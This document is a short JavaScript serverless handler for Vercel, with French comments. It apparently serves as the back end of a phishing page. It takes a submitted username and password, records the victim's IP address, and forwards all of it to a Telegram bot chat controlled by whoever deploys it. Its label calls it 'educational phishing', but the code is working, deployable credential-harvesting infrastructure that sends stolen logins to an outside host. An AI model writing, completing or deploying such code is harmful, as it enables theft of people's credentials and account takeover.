export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { user, pass } = req.body;
    
    // Récupération de l'IP via les headers de Vercel
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // Variables sécurisées sur Vercel
    const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const text = `⚠️ *ALERTE PHISHING ÉDUCATIF*\n\n` +
                 `👤 *Utilisateur:* \`${user}\`\n` +
                 `🔑 *Mot de passe:* \`${pass}\`\n` +
                 `🌐 *Adresse IP:* ${ip}\n` +
                 `📍 *Source:* Vercel Serverless`;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: "Markdown"
            })
        });
        return res.status(200).json({ success: true });
    } catch (error) {
        return res.status(500).json({ error: 'Failed to send to Telegram' });
    }
}
